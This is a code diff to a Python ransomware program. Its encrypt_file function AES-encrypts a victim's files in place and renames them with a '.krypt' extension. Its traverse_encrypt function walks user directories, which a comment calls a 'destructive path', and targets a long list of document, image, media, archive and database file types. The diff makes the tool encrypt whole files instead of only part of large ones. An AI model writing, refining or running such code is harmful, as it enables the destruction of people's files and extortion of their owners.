@@ -150,31 +150,16 @@ def generate_key():
 
 # Encyrpt and corrupt file chosen
 def encrypt_file(file_path, key):
-    threshold_bytes = 52428800 # 50MB is the threshold
-    half_size = threshold_bytes//2 # Size to encyrpt if file is 50mb
-    file_size = os.path.getsize(file_path)
-
     try:
-        if file_size <= threshold_bytes:
-            with open(file_path, "rb") as file:
-                file_content = file.read()   
-        else:
-            with open(file_path, "rb") as file:
-                file_content = file.read(half_size) # Read and store half of the file
+        with open(file_path, "rb") as file:
+            file_content = file.read()   
             
         cipher = AES.new(key, AES.MODE_CBC)
         iv = cipher.iv
         encrypted_data = iv + cipher.encrypt(pad(file_content, AES.block_size))
         
-        if file_size <= threshold_bytes:
-            with open(file_path, 'wb') as file:
-                file.write(encrypted_data)
-        else:
-            with open(file_path, 'r+b') as file:
-                file.write(encrypted_data)
-                file.seek(len(encrypted_data))  # Move the file pointer to the end of the encrypted data
-                remaining_content = file.read()
-                file.write(remaining_content)  # Re-write the remaining unencrypted content
+        with open(file_path, 'wb') as file:
+            file.write(encrypted_data)
             
         rename_file_with_counter(file_path, '.krypt')
     except PermissionError:
@@ -219,9 +204,8 @@ def traverse_encrypt(drive, key):
         username = os.environ.get('USERNAME') # Try username through enviromental variables
     
     extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', 
-                '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv', '.dat', '.db', 
-                '.log', '.cfg', '.ini', '.py', '.bak', '.yml', '.yaml')
-
+                  '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
+    
     def get_main_dirs(username, drive):
         # Construct dynamic destructive path
         main_dirs = [
